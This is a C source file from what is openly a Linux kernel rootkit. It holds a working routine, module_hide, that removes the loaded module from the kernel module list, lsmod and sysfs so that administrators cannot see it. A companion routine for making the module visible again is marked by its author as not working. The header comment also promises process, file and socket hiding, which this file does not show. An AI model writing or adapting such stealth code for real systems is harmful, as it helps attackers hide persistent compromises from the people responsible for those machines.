/*
 * This file contains a set of functions for hiding the work 
 * of the rootkit. These functions include: hiding the module, 
 * hiding processes, hiding files and directories, hiding 
 * sockets, ports and network packets.
 */
#include "header/hide.h"
#include "header/config.h"



static int module_hidden = 0;
static struct list_head *module_previous;
static struct kobject *module_kobj_previous;


void module_hide(void) {
    if (!module_hidden) {
        /* Save the addr of this module to restore if necessary */
        module_previous = THIS_MODULE->list.prev;
        module_kobj_previous = THIS_MODULE->mkobj.kobj.parent;

        /* Hide from '/proc/modules' */
        list_del(&THIS_MODULE->list);

        /* Hide from 'lsmod' and '/sys/modules' */
        kobject_del(&THIS_MODULE->mkobj.kobj);

        /*
         * Remove the symbol and string tables for kallsyms
         * IF NOT SET TO NULL, IT WILL GET THE FOLLOWING ERROR MSG:
         * "sysfs group ffff8800260e4000 not found for kobject "
         */
        THIS_MODULE->sect_attrs = NULL;
        THIS_MODULE->notes_attrs = NULL;

        module_hidden = !module_hidden;

        printk("rootkit: in stealth mode module\n");
    }
}


/*
 * DON'T WORK!!!!!!!!!
 * No directories in /sys/module/rootkit/
 * It may be necessary to use: void kobject_init (struct kobject *kobj);
 */
void module_show(void) {
    if (module_hidden) {
        /* Add to /proc/modules */
        list_add(&THIS_MODULE->list, module_previous);

        /* Add to /sys/module/ */
        /* http://elixir.free-electrons.com/linux/latest/source/lib/kobject.c */
        // THIS_MODULE->mkobj.kobj = module_kobj_previous;
        
        // THIS_MODULE->mkobj.kobj.state_initialized = 0;
        
        kobject_init(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.ktype);
        if (kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, 
                        ROOTKIT_MODULE_NAME) < 0) {
            printk("rootkit: error to restore kobject to the list back!!\n");
        }

        // Restore the sysfs directory entry (second approach)
        //struct sysfs_dirent **pos;
        //struct sysfs_dirent *sd = &THIS_MODULE->mkobj.kobj.sd;
        //for (pos = &sd->s_parent->s_dir.children; *pos; pos = &(*pos)->s_sibling);
        //    *pos = sd;

        module_hidden = !module_hidden;

        printk("rootkit: in invisible mode module\n");
    }
}

/*
extern struct module __this_module;
#define THIS_MODULE (&__this_module)
*/

/*
struct module {
    enum module_state state;

    struct list_head list;
    char name[MODULE_NAME_LEN];
    struct module_kobject mkobj;
    struct module_attribute *modinfo_attrs;
    const char *version;
    const char *srcversion;
    struct kobject *holders_dir;

    const struct kernel_symbol *syms;
    const s32 *crcs;
    unsigned int num_syms;

    ...
} ____cacheline_aligned;
*/

/*
struct module_kobject {
    struct kobject kobj;
    struct module *mod;
    struct kobject *drivers_dir;
    struct module_param_attrs *mp;
    struct completion *kobj_completion;
};
*/

/*
struct kobject {
    const char      *name;
    struct list_head    entry;
    struct kobject      *parent;
    struct kset     *kset;
    struct kobj_type    *ktype;
    struct kernfs_node  *sd;
    struct kref     kref;
    ...
};
*/